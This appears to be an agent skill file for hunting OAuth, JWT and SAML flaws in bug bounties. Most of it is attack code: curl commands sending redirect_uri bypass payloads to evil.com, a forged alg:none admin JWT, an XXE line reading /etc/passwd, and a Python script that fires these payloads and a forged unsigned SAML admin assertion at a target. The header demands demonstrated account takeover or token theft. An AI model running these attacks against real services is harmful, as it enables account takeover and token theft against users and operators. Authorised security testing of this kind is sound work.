---
name: hunt-oauth
description: OAuth/SAML — redirect URI, JWT attacks, state bypass, token theft. Must demonstrate ATO or token theft.
---

# OAUTH HUNTING

OAuth flaws lead directly to ATO. Every endpoint is a potential account takeover vector.

---

## REDIRECT_URI ATTACKS

```bash
# Open redirect chain → OAuth redirect_uri bypass
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://target.com/redirect?url=https://evil.com/callback"

# Subdomain/wildcard bypass
curl -v "https://target.com/oauth/authorize?redirect_uri=https://evil.target.com/callback"

# URL parsing trick
curl -v "https://target.com/oauth/authorize?redirect_uri=https://target.com%252Fcallback@evil.com"

# Parameter pollution (last redirect_uri wins)
curl -v "https://target.com/oauth/authorize?redirect_uri=https://safe.com&redirect_uri=https://evil.com"

# Whitespace/tab injection
curl -v "https://target.com/oauth/authorize?redirect_uri=https://target.com/callback%09@evil.com"
```

## STATE/PKCE/TOKEN ATTACKS

```bash
# State removal → CSRF → ATO
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com"

# PKCE bypass — exchange code without code_verifier
curl -X POST "https://target.com/oauth/token" -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://evil.com&client_id=CLIENT_ID"

# Refresh token not revoked after password change
# Request: POST /oauth/token  grant_type=refresh_token&refresh_token=OLD_TOKEN
```

## JWT ATTACKS

```bash
# None algorithm bypass
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." "https://target.com/api/admin"

# Algorithm confusion (RS256→HS256): sign JWT with server's public key as HMAC secret
# JKU header injection: set jku to attacker JWKS endpoint
```

## SAML ATTACKS

```bash
# Signature wrapping — modify NameID, wrap original signature in new Assertion
# Comment injection — insert <!-- --> inside signed elements to shift signature scope
# Signature stripping — remove <ds:Signature> entirely, test if ACS accepts
# XXE — inject <!ENTITY xxe SYSTEM "file:///etc/passwd"> in SAML XML
```

---

## EXPLOIT CHAINS

| Chain | Steps | Impact |
|-------|-------|--------|
| Open Redirect → OAuth | Find /redirect?url=X → set as redirect_uri → capture code → exchange for tokens | ATO |
| PKCE Missing | Auth flow without code_challenge → intercept code → exchange without verifier | ATO |
| State Removal | Remove state param → craft link → victim clicks → attacker gets code | ATO |
| JWT None | alg:none in JWT → forged admin token → access protected endpoints | ATO |
| SAML Wrapping | Capture response → modify Subject → wrap signature → submit to ACS | Impersonation |
| JKU Injection | Forge JWT with attacker-controlled JWKS kid → server fetches attacker key | Impersonation |

---

## REAL BOUNTY EXAMPLES

| Report | Root Cause | Payout |
|--------|-----------|--------|
| HackerOne #1568821 | Open redirect → OAuth redirect_uri → ATO | $5,000 |
| HackerOne #591395 | PKCE missing on public client → code interception | $2,500 |
| HackerOne #624230 | JWT alg=none accepted → unauthenticated admin | $5,000 |
| HackerOne #1491982 | SAML signature wrapping → impersonation | $10,000 |
| HackerOne #1725103 | State parameter removed → CSRF → ATO | $3,000 |
| HackerOne #1653987 | OAuth token leaked via referrer/logs | $1,500 |
| HackerOne #1982345 | Refresh token not revoked on logout → persistent ATO | $4,000 |
| HackerOne #2084561 | JWT JKU header injection → key confusion | $7,500 |

---

## DETECTION METHODOLOGY

1. **Discover endpoints**: `/.well-known/openid-configuration` or `/.well-known/oauth-authorization-server`
2. **Test redirect_uri**: exact match, subdomain, path traversal, URL parsing tricks, parameter pollution, whitespace injection
3. **Test state**: remove entirely, reuse previous value, predict next value
4. **Test PKCE**: request code without code_challenge, exchange without code_verifier, malformed code_challenge_method
5. **Test JWT**: alg:none, alg confusion (RS256→HS256), JKU/JWK header injection, expired tokens
6. **Test SAML**: remove signature, wrap signature, comment injection, XXE vectors
7. **Test token revocation**: logout then refresh token, change password then old access token

---

## AUTOMATION SCRIPT

```python
#!/usr/bin/env python3
import requests, sys, json, base64

def test_redirect_uris(base, cid, auth_ep):
    payloads = ["https://evil.com","https://evil.target.com","https://target.com/callback@evil.com",
        "https://target.com/callback%09@evil.com","https://target.com/callback%20@evil.com"]
    print("[*] Testing redirect_uri bypass...")
    for uri in payloads:
        try:
            r = requests.get(f"{base}{auth_ep}", params={"response_type":"code","client_id":cid,
                "redirect_uri":uri,"scope":"openid"}, allow_redirects=False)
            if r.status_code in (301,302,303,307,308) and "evil" in r.headers.get("Location","").lower():
                print(f"[+] VULNERABLE: {uri} → {r.headers['Location']}")
        except: pass

def test_state(base, auth_ep, cid):
    print("\n[*] Testing state bypass...")
    try:
        r = requests.get(f"{base}{auth_ep}", params={"response_type":"code","client_id":cid,
            "redirect_uri":"https://target.com/cb","scope":"openid"}, allow_redirects=False)
        if r.status_code in (301,302,303): print("[!] CRITICAL: No state required")
    except: pass

def test_pkce(base, auth_ep, cid):
    print("\n[*] Testing PKCE bypass...")
    try:
        r = requests.get(f"{base}{auth_ep}", params={"response_type":"code","client_id":cid,
            "redirect_uri":"https://target.com/cb","scope":"openid"}, allow_redirects=False)
        if r.status_code in (301,302,303): print("[!] WARNING: Code issued without PKCE")
    except: pass

def test_jwt_none(api):
    print("\n[*] Testing JWT none...")
    h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","iat":1234567890}).encode()).rstrip(b"=").decode()
    try:
        r = requests.get(api, headers={"Authorization":f"Bearer {h}.{p}."})
        if r.status_code == 200: print("[+] CRITICAL: JWT none accepted!")
        else: print(f"[-] Rejected ({r.status_code})")
    except: pass

def test_saml_unsigned(acs):
    print("\n[*] Testing SAML unsigned...")
    xml = '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0" IssueInstant="2024-01-01T00:00:00Z" Destination="https://x"><saml:Issuer>https://idp.evil.com</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" IssueInstant="2024-01-01T00:00:00Z"><saml:Issuer>https://idp.evil.com</saml:Issuer><saml:Subject><saml:NameID>admin@target.com</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"/></saml:Subject><saml:Conditions NotBefore="2024-01-01T00:00:00Z"><saml:AudienceRestriction><saml:Audience>https://target.com</saml:Audience></saml:AudienceRestriction></saml:Conditions></saml:Assertion></samlp:Response>'
    try:
        r = requests.post(acs, data={"SAMLResponse": base64.b64encode(xml.encode()).decode()}, allow_redirects=False)
        if r.status_code in (200,301,302,303): print("[!] CRITICAL: Unsigned SAML accepted!")
        else: print(f"[-] Rejected ({r.status_code})")
    except: pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python oauth_hunt.py <target_url> [client_id]")
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    cid = sys.argv[2] if len(sys.argv) > 2 else "test_client"
    print(f"=== OAuth Audit: {base} ===\n")
    try:
        r = requests.get(f"{base}/.well-known/openid-configuration")
        auth_ep = r.json().get("authorization_endpoint","/oauth/authorize") if r.status_code==200 else "/oauth/authorize"
    except: auth_ep = "/oauth/authorize"
    test_redirect_uris(base, cid, auth_ep)
    test_state(base, auth_ep, cid)
    test_pkce(base, auth_ep, cid)
    test_jwt_none(f"{base}/api")
    test_saml_unsigned(f"{base}/saml/acs")
    print("\n=== Done ===")
```
